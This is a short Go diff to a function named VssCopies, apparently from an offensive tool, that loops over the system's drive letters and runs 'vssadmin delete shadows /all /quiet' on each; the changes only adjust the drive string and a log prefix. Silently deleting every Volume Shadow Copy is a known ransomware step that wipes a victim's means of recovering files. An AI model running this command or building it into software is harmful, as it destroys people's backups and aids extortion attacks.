@@ -52,11 +52,11 @@ func VssCopies() {
 	reg, _ := regexp.Compile("[^a-zA-Z0-9]+")
 	cleanedString := reg.ReplaceAllString(buffStr, "")
 	for _, d := range cleanedString {
-		drive := string(d) + ":\\"
+		drive := string(d) + ":"
 		fmt.Printf("[+] deleting shadow copies for %s\n", drive)
 		cmd += fmt.Sprintf("cmd.exe /c "+"vssadmin delete shadows /all /for=%s /quiet", drive)
 		output := execCmd(cmd)
-		fmt.Printf("vss output: %s\n", output)
+		fmt.Printf("[+] vss output: %s\n", output)
 		fmt.Printf("[+] done!\n")
 		cmd = ""
 	}
